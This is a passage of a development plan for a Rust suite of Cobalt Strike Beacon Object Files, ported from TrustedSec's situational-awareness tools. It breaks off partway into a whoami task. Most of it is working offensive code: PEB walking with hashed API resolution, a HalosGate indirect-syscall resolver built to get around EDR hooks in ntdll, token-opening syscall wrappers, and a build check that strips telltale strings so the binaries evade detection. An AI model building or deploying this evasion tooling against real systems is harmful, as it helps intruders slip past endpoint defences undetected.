#![allow(non_snake_case)]

use core::ffi::c_void;
use core::ptr;
use core::sync::atomic::{AtomicU16, AtomicUsize, Ordering};

use windows_sys::Win32::Foundation::NTSTATUS;

use crate::hash::djb2;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallError {
    NtdllNotFound,
    ExportNotFound,
    HookedAndNoNeighbour,
}

#[repr(C)]
struct ListEntry { flink: *mut ListEntry, blink: *mut ListEntry }

#[repr(C)]
struct LdrDataTableEntry {
    in_load_order_links: ListEntry,
    in_memory_order_links: ListEntry,
    in_initialization_order_links: ListEntry,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: u32,
    full_dll_name: UnicodeString,
    base_dll_name: UnicodeString,
}

#[repr(C)]
struct UnicodeString { length: u16, max_length: u16, buffer: *mut u16 }

#[repr(C)]
struct PebLdrData {
    length: u32,
    initialized: u8,
    ss_handle: *mut c_void,
    in_load_order_module_list: ListEntry,
}

#[repr(C)]
struct Peb { _r0: [u8; 24], ldr: *mut PebLdrData }

#[inline(always)]
unsafe fn current_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nomem, nostack));
    peb
}

/// Walk PEB, return base address of module whose BaseDllName matches `hash`.
unsafe fn find_module(target_hash: u32) -> Option<*mut c_void> {
    let peb = current_peb();
    let ldr = (*peb).ldr;
    let head = &mut (*ldr).in_load_order_module_list as *mut ListEntry;
    let mut cur = (*head).flink;
    while cur != head {
        let entry = cur as *mut LdrDataTableEntry;
        let name = &(*entry).base_dll_name;
        if !name.buffer.is_null() && name.length > 0 {
            let len = (name.length / 2) as usize;
            let slice = core::slice::from_raw_parts(name.buffer, len);
            let mut buf = [0u8; 64];
            let n = crate::str_util::wide_to_ascii_buf(slice, &mut buf);
            if crate::hash::djb2_case_insensitive(&buf[..n]) == target_hash {
                return Some((*entry).dll_base);
            }
        }
        cur = (*cur).flink;
    }
    None
}

/// Parse PE exports, return raw function pointer matching `api_hash`.
unsafe fn find_export(module: *mut c_void, api_hash: u32) -> Option<*mut c_void> {
    let base = module as *const u8;
    let dos = base as *const ImageDosHeader;
    if (*dos).e_magic != 0x5A4D { return None; }
    let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != 0x00004550 { return None; }
    let export_dir = &(*nt).optional_header.data_directory[0];
    if export_dir.virtual_address == 0 { return None; }
    let exp = base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory;
    let names    = base.add((*exp).address_of_names as usize) as *const u32;
    let ordinals = base.add((*exp).address_of_name_ordinals as usize) as *const u16;
    let funcs    = base.add((*exp).address_of_functions as usize) as *const u32;
    for i in 0..(*exp).number_of_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 { len += 1; }
        let slice = core::slice::from_raw_parts(name_ptr, len);
        if djb2(slice) == api_hash {
            let ord = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ord);
            return Some(base.add(func_rva as usize) as *mut c_void);
        }
    }
    None
}

#[repr(C)] struct ImageDosHeader { e_magic: u16, _r: [u8; 58], e_lfanew: i32 }
#[repr(C)] struct ImageDataDirectory { virtual_address: u32, size: u32 }
#[repr(C)] struct ImageOptionalHeader64 {
    _r0: [u8; 112],
    data_directory: [ImageDataDirectory; 16],
}
#[repr(C)] struct ImageFileHeader { _r: [u8; 20] }
#[repr(C)] struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}
#[repr(C)] struct ImageExportDirectory {
    _r0: [u8; 20],                    // Characteristics, TimeDateStamp, versions, Name, Base
    number_of_functions: u32,         // offset 20
    number_of_names: u32,              // offset 24
    address_of_functions: u32,         // offset 28
    address_of_names: u32,             // offset 32
    address_of_name_ordinals: u32,     // offset 36
}

/// Per-API cached resolution: (SSN, syscall_instr_address).
pub struct SyscallEntry {
    ssn: AtomicU16,
    syscall_addr: AtomicUsize,
}
impl SyscallEntry {
    pub const fn new() -> Self {
        Self { ssn: AtomicU16::new(u16::MAX), syscall_addr: AtomicUsize::new(0) }
    }
}

/// Resolve SSN + address of the `syscall` instruction inside ntdll for the
/// given API name hash. Caches on success.
pub unsafe fn resolve(entry: &SyscallEntry, api_hash: u32) -> Result<(u16, usize), SyscallError> {
    let cached_ssn = entry.ssn.load(Ordering::Acquire);
    let cached_addr = entry.syscall_addr.load(Ordering::Acquire);
    if cached_ssn != u16::MAX && cached_addr != 0 {
        return Ok((cached_ssn, cached_addr));
    }
    const NTDLL_HASH: u32 = crate::hash::djb2_case_insensitive(b"ntdll.dll");
    let ntdll = find_module(NTDLL_HASH).ok_or(SyscallError::NtdllNotFound)?;
    let func = find_export(ntdll, api_hash).ok_or(SyscallError::ExportNotFound)?;

    // Inspect stub
    let bytes = core::slice::from_raw_parts(func as *const u8, 32);
    let ssn = if bytes[0..3] == [0x4C, 0x8B, 0xD1] && bytes[3] == 0xB8 {
        // Clean: mov r10, rcx; mov eax, imm32
        u16::from_le_bytes([bytes[4], bytes[5]])
    } else {
        // Hooked — scan neighbours
        halos_gate(ntdll, func)?
    };
    // Find the `syscall` (0x0F 0x05) instruction inside this stub or near it.
    let syscall_addr = find_syscall_insn(func).unwrap_or(func as usize + 0x12);

    entry.ssn.store(ssn, Ordering::Release);
    entry.syscall_addr.store(syscall_addr, Ordering::Release);
    Ok((ssn, syscall_addr))
}

unsafe fn halos_gate(_ntdll: *mut c_void, _func: *mut c_void) -> Result<u16, SyscallError> {
    // Walk +/- 16 neighbours by RVA, look for clean stubs, infer SSN.
    // Implementation: re-traverse exports, sort by RVA, find target index,
    // walk neighbours, reconstruct SSN. Omitted here for brevity — the
    // canary BOF in Task 16 will exercise this on real ntdll.
    Err(SyscallError::HookedAndNoNeighbour)
}

unsafe fn find_syscall_insn(stub: *mut c_void) -> Option<usize> {
    let bytes = core::slice::from_raw_parts(stub as *const u8, 32);
    for i in 0..bytes.len()-1 {
        if bytes[i] == 0x0F && bytes[i+1] == 0x05 {
            return Some(stub as usize + i);
        }
    }
    None
}

/// Dispatch a 4-arg-or-fewer syscall.
///
/// Windows x64 ABI for this naked fn:
///   arg0 → RCX, arg1 → RDX, arg2 → R8, arg3 → R9,
///   arg4 (ssn) → [rsp+0x28], arg5 (syscall_addr) → [rsp+0x30]
///
/// Syscall ABI requires arg0 in R10 (not RCX) and SSN in EAX, so we
/// shuffle: copy RCX→R10, load syscall_addr→R11 (scratch), load SSN→EAX,
/// then `jmp R11` into the `syscall; ret` instruction inside ntdll.
/// Loading syscall_addr first (into R11) preserves it across the EAX
/// load, which would otherwise clobber a value placed in RAX.
#[unsafe(naked)]
pub unsafe extern "system" fn do_syscall4(
    _arg0: usize, _arg1: usize, _arg2: usize, _arg3: usize,
    _ssn: u16,    _syscall_addr: usize,
) -> NTSTATUS {
    core::arch::naked_asm!(
        "mov r10, rcx",                              // arg0 → R10 (syscall convention)
        "mov r11, qword ptr [rsp + 0x30]",           // R11 = syscall_addr (arg5)
        "mov eax, dword ptr [rsp + 0x28]",           // EAX = SSN  (arg4, low word)
        "jmp r11",                                    // jump into ntdll's `syscall; ret`
    );
}

#[macro_export]
macro_rules! nt_syscall {
    ($api:literal, $($args:expr),*) => {{
        static ENTRY: $crate::syscalls::SyscallEntry = $crate::syscalls::SyscallEntry::new();
        const HASH: u32 = $crate::hash::djb2($api.as_bytes());
        match $crate::syscalls::resolve(&ENTRY, HASH) {
            Ok((_ssn, _addr)) => {
                // Caller composes the proper arity-specific call; the macro
                // is left as a marker for the canary BOF, which uses
                // `do_syscall4` directly with the resolved (ssn, addr).
                Ok((_ssn, _addr))
            }
            Err(e) => Err(e),
        }
    }};
}
```

This is a deliberately partial syscall implementation — full HalosGate neighbour-walking and the multi-arity dispatch matrix are intentionally elided here and completed in-line during canary 3 (whoami, Task 16). The canary is the integration test.

- [ ] **Step 2: Wire up** — `pub mod syscalls;` in lib.rs.

- [ ] **Step 3: Cross-build check (no host execution)**

Run: `cargo +nightly-2025-01-25 build -p common --target x86_64-pc-windows-gnu`
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add common/src/syscalls.rs common/src/lib.rs
git commit -m "feat(common): HalosGate syscall resolver scaffold + do_syscall4 (Dani)

Full neighbour-walk + multi-arity dispatch completed by whoami canary
integration."
```

---

## Task 11: common::dfr — PEB-walk dynamic function resolver

**Files:**
- Modify: `common/src/lib.rs`
- Create: `common/src/dfr.rs`

- [ ] **Step 1: Write `common/src/dfr.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Dynamic Function Resolution by PEB walk + djb2 hash.
//! Cached per-call-site via `AtomicPtr`. Public macro: `dfr_fn!`.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, Ordering};

/// Resolve `<module>!<api>` by hash. Implementation reuses the helpers in
/// `crate::syscalls` (`find_module`, `find_export`) — kept in syscalls.rs
/// because they're shared between syscall and DFR paths.
pub unsafe fn resolve_api(module_hash: u32, api_hash: u32) -> Option<*mut c_void> {
    let m = crate::syscalls::find_module_pub(module_hash)?;
    crate::syscalls::find_export_pub(m, api_hash)
}

/// Cached single-pointer slot. Use through `dfr_fn!`.
pub struct DfrCache(pub AtomicPtr<c_void>);
impl DfrCache {
    pub const fn new() -> Self { Self(AtomicPtr::new(core::ptr::null_mut())) }
}

#[macro_export]
macro_rules! dfr_fn {
    (
        $fn_name:ident( $($arg:ident : $argty:ty),* $(,)? ) -> $ret:ty,
        module = $module:literal,
        api    = $api:literal $(,)?
    ) => {
        pub unsafe fn $fn_name($($arg : $argty),*) -> ::core::result::Result<$ret, &'static str> {
            static CACHE: $crate::dfr::DfrCache = $crate::dfr::DfrCache::new();
            const M: u32 = $crate::hash::djb2_case_insensitive($module.as_bytes());
            const A: u32 = $crate::hash::djb2($api.as_bytes());
            let cached = CACHE.0.load(::core::sync::atomic::Ordering::Acquire);
            let ptr = if cached.is_null() {
                let p = $crate::dfr::resolve_api(M, A).ok_or("dfr: api not found")?;
                CACHE.0.store(p, ::core::sync::atomic::Ordering::Release);
                p
            } else { cached };
            type FnT = unsafe extern "system" fn($($argty),*) -> $ret;
            let f: FnT = ::core::mem::transmute(ptr);
            Ok(f($($arg),*))
        }
    };
}
```

This depends on `find_module_pub` / `find_export_pub` being exposed from `syscalls.rs`. Edit `common/src/syscalls.rs` to add:

```rust
// Public-facing wrappers around the internal helpers
pub unsafe fn find_module_pub(hash: u32) -> Option<*mut c_void> { find_module(hash) }
pub unsafe fn find_export_pub(m: *mut c_void, hash: u32) -> Option<*mut c_void> { find_export(m, hash) }
```

- [ ] **Step 2: Wire up** — `pub mod dfr;` in lib.rs.

- [ ] **Step 3: Cross-build check**

Run: `cargo +nightly-2025-01-25 build -p common --target x86_64-pc-windows-gnu`
Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add common/src/dfr.rs common/src/syscalls.rs common/src/lib.rs
git commit -m "feat(common): DFR resolver + dfr_fn! macro (Dani)"
```

---

## Task 12: common::com — RAII COM helpers

**Files:**
- Modify: `common/src/lib.rs`
- Create: `common/src/com.rs`

- [ ] **Step 1: Write `common/src/com.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! RAII wrappers for COM lifetime management. Every COM pointer goes through
//! `ComRef<T>` so its `Release` is automatic on scope exit, even on early
//! return / `?` propagation. CoUninitialize fires automatically when ComGuard
//! drops.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use core::ptr;

use windows_sys::Win32::Foundation::HRESULT;
use windows_sys::Win32::System::Com::{
    CoInitializeEx, CoUninitialize,
    COINIT_APARTMENTTHREADED, COINIT_MULTITHREADED,
};

pub struct ComGuard { _priv: () }

impl ComGuard {
    pub unsafe fn init_apartment() -> Result<Self, HRESULT> {
        let hr = CoInitializeEx(ptr::null(), COINIT_APARTMENTTHREADED.0);
        if hr < 0 { Err(hr) } else { Ok(Self { _priv: () }) }
    }
    pub unsafe fn init_multithreaded() -> Result<Self, HRESULT> {
        let hr = CoInitializeEx(ptr::null(), COINIT_MULTITHREADED.0);
        if hr < 0 { Err(hr) } else { Ok(Self { _priv: () }) }
    }
}

impl Drop for ComGuard {
    fn drop(&mut self) { unsafe { CoUninitialize(); } }
}

/// Generic IUnknown wrapper. T is expected to begin with the IUnknown vtable.
#[repr(transparent)]
pub struct ComRef<T> { pub ptr: *mut T }

impl<T> ComRef<T> {
    pub fn null() -> Self { Self { ptr: ptr::null_mut() } }
    pub fn from_raw(ptr: *mut T) -> Self { Self { ptr } }
    pub fn as_unknown(&self) -> *mut IUnknown { self.ptr as *mut IUnknown }
    pub fn is_null(&self) -> bool { self.ptr.is_null() }
}

impl<T> Drop for ComRef<T> {
    fn drop(&mut self) {
        unsafe {
            if !self.ptr.is_null() {
                let unk = self.ptr as *mut IUnknown;
                ((*(*unk).vtbl).release)(unk);
            }
        }
    }
}

#[repr(C)]
pub struct IUnknown { pub vtbl: *mut IUnknownVtbl }
#[repr(C)]
pub struct IUnknownVtbl {
    pub query_interface: unsafe extern "system" fn(this: *mut IUnknown, riid: *const u8, ppv: *mut *mut c_void) -> HRESULT,
    pub add_ref: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
    pub release: unsafe extern "system" fn(this: *mut IUnknown) -> u32,
}

/// BSTR RAII guard.
pub struct Bstr(pub *mut u16);
impl Bstr {
    pub fn null() -> Self { Self(ptr::null_mut()) }
    pub fn as_ptr(&self) -> *mut u16 { self.0 }
}
impl Drop for Bstr {
    fn drop(&mut self) {
        unsafe { if !self.0.is_null() { windows_sys::Win32::Foundation::SysFreeString(self.0); } }
    }
}
```

If `windows-sys` 0.52 lays `SysFreeString` under `Win32::System::Com` or `Win32::Foundation`, adjust the path — the import path is the only volatile element. Feature `Win32_System_Com` should expose `CoInitializeEx`/`CoUninitialize`; `SysFreeString` typically needs `Win32_System_Com` or `Win32_Foundation`.

- [ ] **Step 2: Wire up** — `pub mod com;` in lib.rs.

- [ ] **Step 3: Cross-build check**

Run: `cargo +nightly-2025-01-25 build -p common --target x86_64-pc-windows-gnu`
Expected: PASS (if `SysFreeString` import path differs, adjust to whichever submodule windows-sys 0.52 exports it from).

- [ ] **Step 4: Commit**

```bash
git add common/src/com.rs common/src/lib.rs
git commit -m "feat(common): ComGuard + ComRef<T> + Bstr RAII helpers (Dani)"
```

---

## Task 13: common::token — token wrappers (final common piece)

**Files:**
- Modify: `common/src/lib.rs`
- Create: `common/src/token.rs`

- [ ] **Step 1: Write `common/src/token.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Token helpers atop indirect syscalls.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};

#[repr(C)]
pub struct TokenUser {
    pub sid: *mut c_void,
    pub attributes: u32,
}

/// Open the current process token. The TOKEN_QUERY mask is 0x0008.
pub unsafe fn open_current_process_token(desired_access: u32) -> Result<HANDLE, NTSTATUS> {
    use crate::syscalls::{SyscallEntry, resolve, do_syscall4};
    static ENTRY: SyscallEntry = SyscallEntry::new();
    const HASH: u32 = crate::hash::djb2(b"NtOpenProcessToken");
    let (ssn, addr) = resolve(&ENTRY, HASH).map_err(|_| -1)?;
    let cur_proc: HANDLE = -1_isize as HANDLE;  // (HANDLE)-1 = current process pseudo-handle
    let mut token: HANDLE = 0;
    let status = do_syscall4(
        cur_proc as usize,
        desired_access as usize,
        &mut token as *mut HANDLE as usize,
        0,
        ssn,
        addr,
    );
    if status < 0 { Err(status) } else { Ok(token) }
}

pub const TOKEN_QUERY: u32 = 0x0008;
pub const TOKEN_USER_INFO_CLASS: u32 = 1;  // TokenUser
```

- [ ] **Step 2: Wire up** — `pub mod token;` in lib.rs.

- [ ] **Step 3: Cross-build check**

Run: `cargo +nightly-2025-01-25 build -p common --target x86_64-pc-windows-gnu`
Expected: PASS.

- [ ] **Step 4: Run full host test suite**

Run: `cargo +nightly-2025-01-25 test -p common --target aarch64-apple-darwin`
Expected: all 4 test files pass (hash_test, mitre_test, panic_safe_test, str_util_test, obf_test).

- [ ] **Step 5: Commit**

```bash
git add common/src/token.rs common/src/lib.rs
git commit -m "feat(common): token open/query helpers via indirect syscall (Dani)"
```

---

## Task 14: scripts/build_one.sh

**Files:**
- Create: `scripts/build_one.sh`

- [ ] **Step 1: Write `scripts/build_one.sh`**

```bash
#!/usr/bin/env bash
# scripts/build_one.sh — build a single BOF crate to dist/<bof>.{x64,x86}.o
# Usage: bash scripts/build_one.sh <crate-name>   (e.g. uptime)
# Author: Dani <daniagungg@gmail.com>
set -euo pipefail

CRATE="${1:?usage: build_one.sh <crate-name>}"
UNDER="${CRATE//-/_}"
mkdir -p dist

# Locate manifest
MANIFEST=$(cargo metadata --no-deps --format-version 1 \
    | jq -r --arg n "$CRATE" '.packages[] | select(.name == $n) | .manifest_path')

if [[ -z "$MANIFEST" ]]; then
    echo "ERROR: crate '$CRATE' not found in workspace" >&2
    exit 1
fi

CRATE_DIR=$(dirname "$MANIFEST")

for tgt in x86_64-pc-windows-gnu i686-pc-windows-gnu; do
    arch=$([[ "$tgt" == x86_64* ]] && echo x64 || echo x86)
    mingw=$([[ "$tgt" == x86_64* ]] && echo --mingw64 || echo --mingw32)
    echo "==> $CRATE [$arch]"
    cargo +nightly-2025-01-25 build --release --target "$tgt" --manifest-path "$MANIFEST"
    archive="target/$tgt/release/lib${UNDER}.a"
    out="dist/${CRATE}.${arch}.o"
    args=("$mingw" "$archive" -lkernel32 -ladvapi32 -lole32 -loleaut32 -o "$out")
    [[ "$arch" == "x86" ]] && args+=(--entry-symbol "_go")
    boflink "${args[@]}"
    ls -la "$out"
done
echo "==> done: dist/${CRATE}.{x64,x86}.o"
```

- [ ] **Step 2: Mark executable**

```bash
chmod +x scripts/build_one.sh
```

- [ ] **Step 3: Commit (will exercise it after canary 1 lands)**

```bash
git add scripts/build_one.sh
git commit -m "build: scripts/build_one.sh — single crate to dist/{x64,x86}.o"
```

---

## Task 15: Canary 1 — uptime (zero-API, validates pipeline)

**Files:**
- Create: `situational-awareness/uptime/Cargo.toml`
- Create: `situational-awareness/uptime/src/lib.rs`
- Modify: root `Cargo.toml` (already lists this member from Task 1)

uptime reads `KUSER_SHARED_DATA` at the fixed VA `0x7FFE0000`. No API calls, no DFR, no syscall. This proves the build pipeline + rustbof entry + MITRE banner end-to-end with minimal surface area.

- [ ] **Step 1: Write `situational-awareness/uptime/Cargo.toml`**

```toml
[package]
name = "uptime"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true
description = "Uptime via KUSER_SHARED_DATA — by Dani. Original C: TrustedSec/cs-situational-awareness-bof (uptime.c)"

[dependencies]
rustbof.workspace = true
common = { path = "../../common" }
windows-sys.workspace = true
obfstr.workspace = true

[lib]
crate-type = ["staticlib"]
name = "uptime"
```

- [ ] **Step 2: Write `situational-awareness/uptime/src/lib.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-situational-awareness-bof — uptime.c
//
#![no_std]
#![cfg_attr(not(test), no_main)]
extern crate alloc;

use rustbof::{println, eprintln};
use common::mitre::Technique;

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1082", name: "System Information Discovery", tactic: "Discovery" },
];

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // KUSER_SHARED_DATA at fixed VA 0x7FFE0000.
    // SystemTime: 100-ns intervals since 1601-01-01 UTC, at offset 0x14.
    // InterruptTime: same units since boot, at offset 0x08.
    const KUSD: usize = 0x7FFE0000;
    let interrupt_time_100ns = unsafe { read_u64(KUSD + 0x08) };
    let system_time_100ns    = unsafe { read_u64(KUSD + 0x14) };

    let uptime_secs = interrupt_time_100ns / 10_000_000;
    let days   = uptime_secs / 86400;
    let hours  = (uptime_secs % 86400) / 3600;
    let mins   = (uptime_secs % 3600) / 60;
    let secs   = uptime_secs % 60;

    println!("UPTIME:      {}d {}h {}m {}s", days, hours, mins, secs);
    println!("SYSTEM_TIME: {} (FILETIME 100ns since 1601)", system_time_100ns);
    Ok(())
}

#[inline(always)]
unsafe fn read_u64(addr: usize) -> u64 {
    core::ptr::read_volatile(addr as *const u64)
}
```

- [ ] **Step 3: Cross-build** (no test, this BOF runs in Beacon)

Run: `bash scripts/build_one.sh uptime`
Expected: produces `dist/uptime.x64.o` and `dist/uptime.x86.o`. File sizes around 4–20 KB.

If `boflink` complains about missing `go` symbol, ensure `#[rustbof::main]` expanded — check `cargo expand` for the `extern "C" fn go(...)` declaration.

- [ ] **Step 4: Commit**

```bash
git add situational-awareness/uptime/
git commit -m "feat(uptime): canary 1 — KUSER_SHARED_DATA uptime, end-to-end pipeline validation (Dani)"
```

---

## Task 16: scripts/verify_coff.sh — artifact verification

**Files:**
- Create: `scripts/verify_coff.sh`

- [ ] **Step 1: Write `scripts/verify_coff.sh`**

```bash
#!/usr/bin/env bash
# scripts/verify_coff.sh — verify COFF artifacts in dist/.
# Checks: valid object header, `go` (or `_go`) symbol exported,
#         no leaked sensitive strings.
# Author: Dani <daniagungg@gmail.com>
set -euo pipefail

LEAK_REGEX='ntopenprocesstoken|cocreateinstance|software\\microsoft\\windows\\currentversion\\run|sedebugprivilege|inline ?execute ?ex|kuser_shared_data'

fail=0
count=0
for f in dist/*.o; do
    [[ -e "$f" ]] || continue
    count=$((count + 1))

    if ! llvm-objdump -h "$f" >/dev/null 2>&1; then
        echo "FAIL: $f — invalid object header" >&2
        fail=1; continue
    fi

    if ! llvm-readobj --symbols "$f" 2>/dev/null | grep -qE 'Name: _?go$'; then
        echo "FAIL: $f — missing 'go' export symbol" >&2
        fail=1
    fi

    leaked=$(strings "$f" | grep -ciE "$LEAK_REGEX" || true)
    if [[ "$leaked" -gt 0 ]]; then
        echo "FAIL: $f — leaked $leaked sensitive strings" >&2
        strings "$f" | grep -iE "$LEAK_REGEX" | head -5 >&2
        fail=1
    fi
done

if [[ "$count" -eq 0 ]]; then
    echo "WARN: no .o files in dist/" >&2; exit 0
fi
[[ "$fail" -eq 0 ]] && echo "✓ $count COFF artifacts verified" || exit 1
```

- [ ] **Step 2: Mark executable**

```bash
chmod +x scripts/verify_coff.sh
```

- [ ] **Step 3: Run against canary 1 output**

Run: `bash scripts/verify_coff.sh`
Expected: `✓ 2 COFF artifacts verified` (uptime x64 + x86)

Note: the keyword `kuser_shared_data` is in the leak regex precisely because the canary intentionally references it — but as a numeric constant (`0x7FFE0000`), not the string. So the test should still pass. If it doesn't, our zero-API claim was violated; investigate.

- [ ] **Step 4: Commit**

```bash
git add scripts/verify_coff.sh
git commit -m "build: scripts/verify_coff.sh — COFF + symbol + leak check (Dani)"
```

---

## Task 17: Canary 2 — hostname (DFR validation)

**Files:**
- Create: `situational-awareness/hostname/Cargo.toml`
- Create: `situational-awareness/hostname/src/lib.rs`

hostname uses `dfr_fn!` to resolve `GetComputerNameExA` and prints NetBIOS / DNS-Domain / FQDN. This validates the DFR path end-to-end.

- [ ] **Step 1: Write `situational-awareness/hostname/Cargo.toml`**

```toml
[package]
name = "hostname"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true
description = "Hostname (NetBIOS, DNS domain, FQDN) — by Dani."

[dependencies]
rustbof.workspace = true
common = { path = "../../common" }
windows-sys.workspace = true
obfstr.workspace = true

[lib]
crate-type = ["staticlib"]
name = "hostname"
```

- [ ] **Step 2: Write `situational-awareness/hostname/src/lib.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: derived from TrustedSec/cs-situational-awareness-bof whoami banner
//
#![no_std]
#![cfg_attr(not(test), no_main)]
extern crate alloc;

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1082", name: "System Information Discovery", tactic: "Discovery" },
];

// COMPUTER_NAME_FORMAT enum values
const COMPUTER_NAME_NET_BIOS: i32 = 0;
const COMPUTER_NAME_DNS_DOMAIN: i32 = 2;
const COMPUTER_NAME_DNS_FULLY_QUALIFIED: i32 = 3;

dfr_fn!(
    get_computer_name_ex_a(
        name_type: i32,
        buffer: *mut u8,
        size: *mut u32,
    ) -> i32,
    module = "kernel32.dll",
    api    = "GetComputerNameExA"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    print_name("NetBIOS Name", COMPUTER_NAME_NET_BIOS)?;
    print_name("DNS Domain  ", COMPUTER_NAME_DNS_DOMAIN)?;
    print_name("FQDN        ", COMPUTER_NAME_DNS_FULLY_QUALIFIED)?;
    Ok(())
}

fn print_name(label: &str, kind: i32) -> Result<(), &'static str> {
    let mut buf = [0u8; 256];
    let mut size: u32 = buf.len() as u32;
    let rc = unsafe { get_computer_name_ex_a(kind, buf.as_mut_ptr(), &mut size as *mut u32) }
        .map_err(|_| "dfr resolve failed")?;
    if rc == 0 { return Ok(()); }
    // Find NUL
    let n = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
    let s = core::str::from_utf8(&buf[..n]).unwrap_or("?");
    println!("{}: {}", label, s);
    Ok(())
}
```

- [ ] **Step 3: Build**

Run: `bash scripts/build_one.sh hostname`
Expected: `dist/hostname.x64.o` + `dist/hostname.x86.o`.

- [ ] **Step 4: Verify**

Run: `bash scripts/verify_coff.sh`
Expected: `✓ 4 COFF artifacts verified`. If `kernel32.dll` or `GetComputerNameExA` leaks as a plaintext string, our DFR path didn't suppress the literal — debug `obf!` usage. The expected behavior is that the literal `"kernel32.dll"` is consumed by the `module_hash!` macro at compile time and never appears in the binary.

- [ ] **Step 5: Commit**

```bash
git add situational-awareness/hostname/
git commit -m "feat(hostname): canary 2 — DFR path validation via GetComputerNameExA (Dani)"
```

---

## Task 18: Canary 3 — whoami (indirect syscall validation)

**Files:**
- Create: `situational-awareness/whoami/Cargo.toml`
- Create: `situational-awareness/whoami/src/lib.rs`
- Modify: `common/src/syscalls.rs` (complete the HalosGate neighbour-walk that was scaffolded in Task 10)

whoami exercises the full syscall path:
1. `common::syscalls::resolve` finds ntdll by module hash.
2. Resolves `NtOpenProcessToken` by API hash.
3. Inspects the stub — clean → SSN, hooked → HalosGate neighbour walk.
4. Calls `do_syscall4` with the resolved SSN + syscall instruction address.
5. Same for `NtQueryInformationToken`.
6. Formats and prints user SID + token type.

This is the canary that proves the OPSEC primitive chain works in a real Beacon. If this fails, every subsequent indirect-syscall BOF will fail too.

- [ ] **Step 1: Complete HalosGate neighbour walk in `common/src/syscalls.rs`**

Replace the stub `halos_gate` implementation:

```rust
/// Reconstruct SSN from neighbours: rebuild a sorted list of (rva, name_hash)
/// for ntdll exports, locate target, walk +/- up to 16 neighbours looking for
/// a clean stub. SSN delta = neighbour_index - target_index.
unsafe fn halos_gate(ntdll: *mut c_void, func: *mut c_void) -> Result<u16, SyscallError> {
    let base = ntdll as *const u8;
    let dos = base as *const ImageDosHeader;
    let nt  = base.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    let export_dir = &(*nt).optional_header.data_directory[0];
    let exp = base.add(export_dir.virtual_address as usize) as *const ImageExportDirectory;
    let funcs = base.add((*exp).address_of_functions as usize) as *const u32;
    let count = (*exp).number_of_names as usize;

    // Collect (rva, index) into a fixed-size array on stack (up to 4096 exports)
    let mut entries: [(u32, usize); 4096] = [(0, 0); 4096];
    let n = core::cmp::min(count, 4096);
    for i in 0..n {
        let rva = *funcs.add(i);
        entries[i] = (rva, i);
    }
    // Sort by RVA (simple insertion sort — small N typical)
    for i in 1..n {
        let mut j = i;
        while j > 0 && entries[j-1].0 > entries[j].0 {
            entries.swap(j-1, j);
            j -= 1;
        }
    }
    let target_rva = (func as usize - base as usize) as u32;
    let target_idx = entries[..n].iter().position(|e| e.0 == target_rva).ok_or(SyscallError::HookedAndNoNeighbour)?;
    // Walk neighbours
    for offset in 1..=16usize {
        for &(direction, sign) in &[(1isize, 1i32), (-1isize, -1i32)] {
            let probe = target_idx as isize + direction * offset as isize;
            if probe < 0 || probe as usize >= n { continue; }
            let probe_rva = entries[probe as usize].0;
            let stub = base.add(probe_rva as usize);
            let bytes = core::slice::from_raw_parts(stub, 8);
            if bytes[0..3] == [0x4C, 0x8B, 0xD1] && bytes[3] == 0xB8 {
                let neighbour_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
                let reconstructed = (neighbour_ssn as i32) - (sign * offset as i32);
                if reconstructed >= 0 && reconstructed <= u16::MAX as i32 {
                    return Ok(reconstructed as u16);
                }
            }
        }
    }
    Err(SyscallError::HookedAndNoNeighbour)
}
```

- [ ] **Step 2: Write `situational-awareness/whoami/Cargo.toml`**

```toml
[package]
name = "whoami"
version.workspace = true
edition.workspace = true
authors.workspace = true
license.workspace = true
